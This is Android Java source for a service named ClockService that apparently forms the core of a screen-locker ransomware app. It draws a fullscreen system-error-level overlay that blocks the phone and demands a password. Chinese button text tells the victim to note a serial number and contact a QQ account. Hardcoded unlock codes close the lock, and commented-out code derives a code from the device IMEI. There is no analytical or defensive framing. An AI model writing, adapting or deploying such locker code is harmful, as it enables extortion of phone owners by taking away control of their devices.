package com.happynew.happynew;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.IBinder;
import android.provider.Settings;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

/**
 * Created by MaiBenBen on 2017/1/30.
 */


public class ClockService extends Service
{
    //是否已增加悬浮窗
    private static boolean isAdded = false;
    //申明一个悬浮窗变量
    private static WindowManager wm;
    private static WindowManager.LayoutParams params;
    //
    private TextView tv;
    static  int i=0;

    //百度public IBinder onBind
    //藐视没有任何作用 只是语法需要，注意参数 Intent
    //原因：继承服务Service 必须重写这个方法
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate()
    {

        /**下面是先判断是否已经开启悬浮窗，然后
         *调用创建悬浮窗方法，可以写在onCreate方
         *法中。
         */
        //如果开启悬浮窗 就执行下面的方法
        if(!isAdded){
            //某种服务  this 在这里是------------------------------!!!!!
            LayoutInflater inflater = (LayoutInflater) this.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
            //LayoutInflater inflater = getLayoutInflater();
            //clock_window.xml 是个布局文件
            //加载一个xml文件（布局文件）作为Viewgroup对象
            final ViewGroup viewGroup = (ViewGroup) inflater.inflate(R.layout.clock_window,null);
            //后几个参数是长宽和坐标   创建悬浮窗
            createFloatView(viewGroup, WindowManager.LayoutParams.WRAP_CONTENT, WindowManager.LayoutParams.WRAP_CONTENT,0,0);
            //获取clock_window.xml上的控件id
            final Button btn=(Button) viewGroup.findViewById(R.id.clockwindowButton1);
            //创建按钮点击监听
            btn.setOnClickListener(new View.OnClickListener(){

                @Override
                public void onClick(View p1)
                {
                    i++;
                    //初始化
                    tv = (TextView) viewGroup.findViewById(R.id.tv);
                    //判断密码是否正确
                    EditText edit=(EditText) viewGroup.findViewById(R.id.clockWindowEditText1);
                    String edittxt=edit.getText().toString();
                    //获取序列号
                    //String Imei = ((TelephonyManager) getSystemService(TELEPHONY_SERVICE))
                          //  .getDeviceId();
                    //String IMEI = Imei.substring(11,15);

                    //tv.setText(IMEI);
                    //加密
                  // int an = answer(Integer.parseInt(IMEI));
                    //System.exit(0) 退出的意思
                    if(1==i)
                        btn.setText("自己试一试密码\n 或者记住序列号、联系QQ");
                    if (i>1&&i<=5)
                        btn.setText("密码不对哦！");
                    if (i>5&&i<10)
                        btn.setText("尝试了这么多次，还是联系QQ吧");
                    if (i>=10)
                        btn.setText("加油");
                    if((edittxt.equals("90010")||edittxt.equals(String.valueOf("1002")))){
                        btn.setText("密码正确");
                        System.exit(0);}

                    // TODO: Implement this method
                }

            });
        }
        super.onCreate();
    }

    @Nullable



    /**
     *创建悬浮窗的方法，参数一是显示的View,后面是高度宽度，坐标
     *坐标00代表屏幕正中间
     */
    private void createFloatView(final ViewGroup floatView,int width,int height,int x,int y) {
        wm = (WindowManager) getApplicationContext().getSystemService(Context.WINDOW_SERVICE);
        params = new WindowManager.LayoutParams();
        // 设置window type
        params.type = WindowManager.LayoutParams.TYPE_SYSTEM_ERROR;
		/*
		 * 如果设置为params.type = WindowManager.LayoutParams.TYPE_PHONE那么优先级会降低一些,
		 * 即拉下通知栏不可见
		 */
        params.format = PixelFormat.RGBA_8888;
        // 设置图片格式，效果为背景透明
        // 设置Window flag
        params.flags = WindowManager.LayoutParams.FLAG_FULLSCREEN;
		/*
		 * 下面的flags属性的效果形同“锁定”。 悬浮窗不可触摸，不接受任何事件,同时不影响后面的事件响应。
		 * wmParams.flags=LayoutParams.FLAG_NOT_TOUCH_MODAL|LayoutParams.FLAG_NOT_FOCUSABLE| LayoutParams.FLAG_NOT_TOUCHABLE;
		 */
        // 设置悬浮窗的长得宽
        params.width = width;
        params.height = height;
        params.x = x;
        params.y = y;
        wm.addView(floatView, params);
        isAdded = true;
    }
    //解密算法
    private int answer(int m){
            m = m%10+m/10+m*2-13;

        return m;
    }


}
